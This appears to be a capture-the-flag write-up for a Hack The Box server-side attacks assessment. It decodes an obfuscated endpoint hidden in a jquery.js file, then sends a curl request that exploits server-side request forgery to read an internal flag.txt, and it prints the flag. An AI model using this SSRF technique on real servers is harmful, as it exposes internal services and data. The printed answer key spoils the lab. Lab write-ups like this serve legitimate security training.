# Server-Side Attacks - Skills Assessment

You are currently participating in a bug bounty program. The company participating in the program is most interested in critical flaws such as injection flaws, logic flaws, and server-side attacks. Server-side attacks are the most desirable and lucrative bug listed in this particular program.

Start by performing all required footprinting activities to obtain as much information as possible regarding the target's tech stack. Then, mount any applicable server-side attack(s) against the target and answer the questions below to complete the skills assessment and finish this module.

**Questions**

Read the content of 'flag.txt' through a server-side attack without registering an account and submit its content as your answer. Answer format: HTB{String}

```bash
#view-source:http://94.237.58.148:43096/static/jquery.js
#change the code from the jquery to print woot
function dec(str) {
	var w = atob(str);
	return w.split("").reverse().join("");
}
function getmessage() {
	var x = "Ly86cHR0aA==";
	var y = "dHNvaC5ub2l0YWNvbC53b2RuaXc=";
	var z = "dHh0LmVnYXNzZW0vMDgwODoxLjAuMC43MjEvLzpwdHRoPXQzM2w/M000M2wxRnQ0aFR0M0cv";
	var woot = dec(x) + eval(dec(y)) + dec(z);
	console.log(woot);
}
#https://jsconsole.com/
getmessage()
#http:///G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt
#http://94.237.58.148:43096/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080
curl http://94.237.58.148:43096/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/flag.txt
HTB{Th4tW4sL33t1snt1t?}
```
